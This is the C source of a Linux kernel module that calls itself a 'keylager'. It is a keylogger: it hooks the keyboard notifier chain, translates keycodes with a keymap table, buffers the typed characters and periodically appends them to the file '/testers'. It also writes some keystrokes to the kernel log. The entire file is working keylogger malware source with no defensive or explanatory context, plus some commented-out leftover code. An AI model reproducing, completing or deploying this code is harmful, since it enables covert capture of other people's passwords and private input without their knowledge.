#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hyp");

static const char *keymap[][2] = {
{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, 
{"8", "*"}, {"9", "("}, {"0", ")"}, {"-", "_"}, {"=", "+"}, 
{"_BACKSPACE_", "_BACKSPACE_"}, {"_TAB_", "_TAB_"}, {"q", "Q"}, 
{"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, 
{"i", "I"}, {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, 
{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, 
{"l", "L"}, {";", ":"}, {"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, 
{"\\", "|"}, {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, 
{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, {".", ">"}, 
{"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_PRTSCR_", "_KPD*_"},
{"_ALT_", "_ALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, 
{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, 
{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 
{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"}, 
{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, 
{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 
{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, 
{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
{"\0", "\0"}, {"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"/", "/"},
{"_PRTSCR_", "_PRTSCR_"}, {"_ALT_", "_ALT_"}, {"\0", "\0"}, 
{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, 
{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, 
{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"_PAUSE_", "_PAUSE_"}, 
};

struct file* file_open(const char* path, int flags, int rights) {
    struct file* filep = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());

    filep = filp_open(path, flags, rights);
    set_fs(oldfs);

    if(IS_ERR(filep)) {
	err = PTR_ERR(filep);
    }
    return filep;
}

void file_close(struct file* filename) {
    filp_close(filename, NULL);
}

int file_write(struct file* filename, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(filename, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

static int shiftKey = 0;
static struct file *fp;
struct semaphore sem;
char keybuf[300] = {};

int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    //struct file *fp = file_open("/testicle", O_WRONLY|O_CREAT, 0664);
    
    if(code == KBD_KEYCODE) {
	if(param->value==42 || param->value==54) {
	    down(&sem);

	    if(param->down)
		shiftKey = 1;
	    else
		shiftKey = 0;

	    up(&sem);
	    return NOTIFY_OK;
	}

	if(param->down) {
	    //down(&sem);

	    if(strlen(keybuf) > 200) {
		fp = file_open("/testers", O_RDWR|O_APPEND, 0644);
		file_write(fp, fp->f_pos, keybuf, strlen(keybuf));
		file_close(fp);

		keybuf[0] = '\0';;
	    }

	    down(&sem);
	    if(shiftKey == 0) {
		//file_write(fp, fp->f_pos, keymap[param->value][0], 
		//	strlen(keymap[param->value][0]));
		strncat(keybuf, keymap[param->value][0], 
		    strlen(keymap[param->value][0]));
			
		printk(KERN_INFO "length: %d\n", (int)strlen(keybuf));
	    } else {
		printk(KERN_INFO "%s \n", keymap[param->value][1]);
	    }
	    up(&sem);

	    /*if(offset > 20) {
		//fp = file_open("/home/testers", O_WRONLY|O_CREAT, 0664);
		//file_write(fp, fp->f_pos, keybuf, strlen(keybuf));
		//file_close(fp);
		printk(KERN_INFO "keybuf: %s offset: %d\n", keybuf,(int)offset);
		offset = 0;
		keybuf[0] = '\0';
		//fp = file_open("/home/testers", O_WRONLY, 0664);
	    }*/
	    //up(&sem);
	}
    }

    return NOTIFY_OK;
}

static struct notifier_block klog_nb =
{
    .notifier_call = keylog
};

//static struct file *fp;

static int __init init_klog(void) {
    register_keyboard_notifier(&klog_nb);
    printk(KERN_INFO "Registering keylager\n");
    sema_init(&sem, 1);

    //fp = file_open("/testers", O_WRONLY|O_CREAT, 0664); 

    return 0;
}

static void __exit cleanup_klog(void) {
    unregister_keyboard_notifier(&klog_nb);
    //file_write(fp, fp->f_pos, keybuf, sizeof(keybuf));
    file_close(fp);

    printk(KERN_INFO "Unregistered keylager\n");
}

module_init(init_klog);
module_exit(cleanup_klog);
	
